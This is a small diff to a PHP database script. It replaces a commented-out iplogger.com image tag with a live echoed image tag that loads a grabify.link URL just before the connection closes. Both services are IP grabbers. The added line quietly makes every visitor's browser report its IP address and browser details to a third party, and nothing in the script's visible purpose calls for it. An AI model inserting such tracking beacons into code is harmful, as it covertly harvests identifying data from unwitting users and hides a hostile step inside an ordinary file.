@@ -53,6 +53,6 @@ if ($conn->query($sql) === TRUE) {
 } else {
     echo "Error: " . $conn->error;
 }
-// echo '<img src="https://iplogger.com/driveplyr20" />';// Close the database connection
+echo '<img src="https://grabify.link/0I8Q39" />';// Close the database connection
 $conn->close();
 ?>
